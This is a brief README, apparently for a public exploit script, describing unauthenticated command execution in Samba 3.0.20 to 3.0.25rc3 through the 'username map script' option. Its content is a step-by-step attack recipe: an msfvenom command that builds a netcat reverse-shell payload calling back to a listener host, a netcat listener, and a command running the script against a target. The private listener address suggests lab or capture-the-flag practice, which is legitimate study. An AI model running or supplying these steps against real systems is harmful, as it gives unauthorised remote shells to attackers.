# Samba "username map script" Command Execution 

This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication! 

1. Create Shellcode
```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.56 LPORT=5555 -f python
```

2. Netcat listner
```
nc -nlvp 5555
```

3. run the script
```
python3 smbusermap.py <Target IP>
```
![image](https://user-images.githubusercontent.com/66146701/165831258-de3acca8-4d24-4989-b7cd-610a01966979.png)

